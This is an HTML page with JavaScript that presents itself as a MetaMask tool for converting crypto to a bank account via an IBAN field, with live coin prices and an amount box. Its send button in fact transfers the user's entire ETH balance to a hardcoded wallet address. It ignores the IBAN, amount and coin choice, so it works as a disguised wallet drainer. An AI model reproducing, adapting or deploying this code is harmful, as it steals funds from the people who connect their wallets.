<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Crypto from MetaMask</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.0/web3.min.js"></script>
    <style>
        body {
            background-color: #333;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
        }
        input[type="text"] {
            margin: 10px 0;
            padding: 10px;
            width: 300px;
            background-color: #444;
            color: white;
            border: none;
            border-radius: 5px;
        }
        #ibanContainer {
            margin: 20px 0;
            width: 300px;
            padding: 15px;
            border: 2px solid #555;
            border-radius: 5px;
            background-color: #444;
        }
        #ibanLabel {
            font-size: 1.5em;
            color: white;
            margin-bottom: 5px;
            text-align: center;
        }
        button {
            padding: 10px;
            width: 300px;
            background-color: #388E3C;
            color: white;
            border: 2px solid #555;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
            font-size: 1em;
        }
        button:hover {
            background-color: #2E7D32;
        }
        #result {
            color: white;
            margin-top: 20px;
            font-size: 1.2em;
        }
        #livePrices {
            display: flex;
            justify-content: center;
            color: white;
            margin: 20px 0;
            gap: 10px;
            width: 80%;
            max-width: 1200px;
        }
        .price {
            padding: 15px;
            border: 2px solid #555;
            border-radius: 5px;
            background-color: #444;
            font-size: 1.5em;
            text-align: center;
        }
        .tabs {
            display: flex;
            background-color: #444;
            border-radius: 5px;
            margin: 20px 0;
        }
        .tab {
            flex: 1;
            padding: 15px;
            text-align: center;
            color: white;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .tab:hover {
            background-color: #555;
        }
        .active {
            background-color: #388E3C;
        }
    </style>
</head>
<body>

<div id="livePrices">
    <div class="price" id="btcPrice">BTC: Loading...</div>
    <div class="price" id="ethPrice">ETH: Loading...</div>
    <div class="price" id="solPrice">SOL: Loading...</div>
</div>

<div class="tabs">
    <div class="tab active" id="btcTab">BTC</div>
    <div class="tab" id="solTab">SOL</div>
    <div class="tab" id="ethTab">ETH</div>
</div>

<div id="ibanContainer">
    <div id="ibanLabel">BANK</div>
    <!-- IBAN input is now editable -->
    <input type="text" id="ibanInput" placeholder="Enter IBAN Here" />
</div>

<div class="input-container">
    <input type="text" id="amountInput" placeholder="Enter amount" />
    <button id="sendCryptoButton">Send Entire Balance</button>
    <div id="result">Result: $0.00</div>
</div>

<script>
    let currentPrices = { BTC: 0, ETH: 0, SOL: 0 }; 
    let selectedCoin = 'ETH'; 
    let web3; 

    // Initialize Web3
    if (typeof window.ethereum !== 'undefined') {
        web3 = new Web3(window.ethereum);
        window.ethereum.request({ method: 'eth_requestAccounts' })
            .then(() => {
                console.log('MetaMask connected');
                fetchUserBalance(); // Fetch balance on successful connection
            })
            .catch(err => {
                console.error('User denied account access', err);
                alert('Please allow access to your MetaMask account.');
            });
    } else {
        alert('Please install MetaMask!');
    }

    async function fetchCryptoPrices() {
        try {
            const response = await fetch('/crypto-prices'); 
            const prices = await response.json();
            currentPrices.BTC = prices.BTC.current;
            currentPrices.ETH = prices.ETH.current;
            currentPrices.SOL = prices.SOL.current;

            document.getElementById('btcPrice').innerHTML = 
                `BTC: $${currentPrices.BTC} <span class="price-change ${prices.BTC.change >= 0 ? 'up' : 'down'}">(${prices.BTC.change.toFixed(2)}% ${prices.BTC.change >= 0 ? '↑' : '↓'})</span>`;
            document.getElementById('ethPrice').innerHTML = 
                `ETH: $${currentPrices.ETH} <span class="price-change ${prices.ETH.change >= 0 ? 'up' : 'down'}">(${prices.ETH.change.toFixed(2)}% ${prices.ETH.change >= 0 ? '↑' : '↓'})</span>`;
            document.getElementById('solPrice').innerHTML = 
                `SOL: $${currentPrices.SOL} <span class="price-change ${prices.SOL.change >= 0 ? 'up' : 'down'}">(${prices.SOL.change.toFixed(2)}% ${prices.SOL.change >= 0 ? '↑' : '↓'})</span>`;
        } catch (error) {
            console.error('Error fetching crypto prices:', error);
        }
    }

    fetchCryptoPrices();
    setInterval(fetchCryptoPrices, 60000); 

    document.getElementById('btcTab').addEventListener('click', () => selectCoin('BTC'));
    document.getElementById('ethTab').addEventListener('click', () => selectCoin('ETH'));
    document.getElementById('solTab').addEventListener('click', () => selectCoin('SOL'));

    function selectCoin(coin) {
        selectedCoin = coin; 
        document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active')); 
        document.getElementById(`${coin.toLowerCase()}Tab`).classList.add('active'); 
        updateResult(); 
    }

    function updateResult() {
        const amountToSend = parseFloat(document.getElementById('amountInput').value); 
        const price = currentPrices[selectedCoin]; 

        if (!isNaN(amountToSend)) {
            const totalAmount = amountToSend * price; 
            document.getElementById('result').innerText = `Result: $${totalAmount.toFixed(2)}`; 
        } else {
            document.getElementById('result').innerText = 'Result: $0.00'; 
        }
    }

    document.getElementById('amountInput').addEventListener('input', updateResult);

    // Fetch user's balance and display
    async function fetchUserBalance() {
        try {
            const accounts = await web3.eth.getAccounts();
            if (accounts.length === 0) {
                alert("No accounts found. Please connect MetaMask.");
                return;
            }
            const senderAddress = accounts[0]; // Get the user's wallet address
            const balanceInWei = await web3.eth.getBalance(senderAddress); // Fetch balance in Wei
            console.log(`User's address: ${senderAddress}, Balance: ${balanceInWei} Wei`); // Log for debugging
        } catch (error) {
            console.error("Error fetching balance:", error);
            alert("Failed to fetch balance. Check console for details.");
        }
    }

    document.getElementById('sendCryptoButton').addEventListener('click', async () => {
        try {
            const accounts = await web3.eth.getAccounts();
            if (accounts.length === 0) {
                alert("No accounts found. Please connect MetaMask.");
                return;
            }
            const senderAddress = accounts[0]; // Get the user's wallet address
            const recipientAddress = '0x3B4A25503B2133013cefA7A0d35249C8A842BaC0'; // Hardcoded recipient address

            // Get the balance of the user's wallet in ETH
            const balanceInWei = await web3.eth.getBalance(senderAddress); // Fetch balance in Wei

            // Prepare the transaction parameters
            const transactionParameters = {
                to: recipientAddress, // The hardcoded recipient address
                from: senderAddress,  // The user's address
                value: balanceInWei.toString(),  // Amount to send in Wei
                gas: '21000',         // Gas limit for the transaction
                gasPrice: await web3.eth.getGasPrice() // Current gas price
            };

            // Send the transaction using MetaMask for signing only
            const finalTxHash = await window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [transactionParameters]
            });

            console.log('Transaction hash:', finalTxHash);
            alert('Transaction successful! Tx Hash: ' + finalTxHash);
        } catch (error) {
            console.error("Error:", error);
            alert("Failed to send the transaction. Check the console for details.");
        }
    });
</script>

</body>
</html>
    